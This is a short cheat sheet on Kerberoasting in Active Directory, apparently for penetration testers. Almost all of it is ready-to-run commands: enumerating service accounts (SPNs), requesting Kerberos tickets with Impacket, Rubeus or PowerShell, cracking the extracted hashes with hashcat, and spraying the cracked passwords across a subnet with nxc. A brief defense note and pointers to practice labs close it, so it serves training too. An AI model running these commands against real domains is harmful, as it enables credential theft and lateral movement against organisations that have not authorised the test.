# Kerberoasting

Any domain user can request a TGS ticket for any service account with an SPN. The ticket is encrypted with the service account's password hash — crack it offline.

## Enumerate SPNs First

```bash
# From Linux — list SPNs without requesting tickets
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP

# Output shows service accounts and their SPNs
```

```powershell
# From Windows (PowerView)
Get-DomainUser -SPN
setspn -T domain.local -Q */*
```

## Request Tickets and Extract Hashes

**From Linux (Impacket):**
```bash
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request
# Outputs $krb5tgs$23$... hashes directly
GetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request -outputfile hashes.kerberoast
```

**From Windows (Rubeus):**
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:svcSQL /outfile:svcSQL.txt   # Target specific account
```

**From Windows (native PowerShell):**
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DC01.domain.local"
```

## Crack with Hashcat

```bash
# RC4 (type 23) — most common
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# AES256 (type 19700) — newer environments
hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## What to Do with Cracked Passwords

Service accounts often have excessive privileges. Check immediately:
```bash
nxc smb DC_IP -u svcSQL -p 'CrackedPassword' --local-auth
nxc smb 192.168.1.0/24 -u svcSQL -p 'CrackedPassword'
```

**Defense note:** Strong random passwords (25+ chars) for service accounts, AES-only ticket encryption, regular SPN audits. Managed Service Accounts (gMSA) eliminate the risk entirely.

**Practice:** HTB Academy Kerberoasting module + GOAD lab (several Kerberoastable accounts pre-configured).
